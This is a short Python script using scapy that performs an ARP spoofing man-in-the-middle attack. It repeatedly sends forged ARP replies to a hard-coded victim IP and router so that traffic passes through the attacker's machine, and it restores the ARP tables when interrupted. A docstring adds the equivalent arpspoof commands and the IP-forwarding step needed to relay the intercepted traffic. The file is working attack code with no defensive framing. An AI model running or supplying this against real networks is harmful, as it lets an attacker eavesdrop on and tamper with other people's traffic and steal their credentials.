import scapy.all as sc
import time 
"""
    instructions
    inbuild tool for arp changing is arpspoof.to excute arpspoof ----> arpspoof -i wlan0 targetip routerip
    simultaneously split terminal and run arpspoof -i wlan0 routerip targetip
    then execute command for linux user security ------->  pass in terminal "echo 1 > /proc/sys/net/ipv4/ip_forward"
"""
def get_mac(ip):
    arp_request = sc.ARP(pdst = ip)
    source_dest = sc.Ether(dst ="ff:ff:ff:ff:ff:ff")
    final = source_dest/arp_request
    ans = sc.srp(final,timeout = 10,verbose = False)[0]
    return ans[0][1].hwsrc


def send_packet(target_ip,spoof_ip):
    mac = get_mac(target_ip)
    packet = sc.ARP(pdst=target_ip,hwdst=mac,op=2,psrc=spoof_ip)
    sc.send(packet,verbose=False)

def restore(destination_ip,source_ip):
    dest_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = sc.ARP(pdst=destination_ip,hwdst=dest_mac,op=2,psrc=source_ip,hwsrc=source_mac)
    sc.send(packet,count=5,verbose=False)


i = 0

windows_ip = "192.168.230.185"
router_ip = "192.168.1.1"

try:
    while True:
        send_packet(windows_ip,router_ip)
        send_packet(router_ip,windows_ip)
        i = i+2
        print("packet sent -",i,end ="")
        time.sleep(2)
except KeyboardInterrupt :
    print("Quiting")
    restore(windows_ip,router_ip)
    restore(router_ip,windows_ip)

finally:
    print("script Completed")
    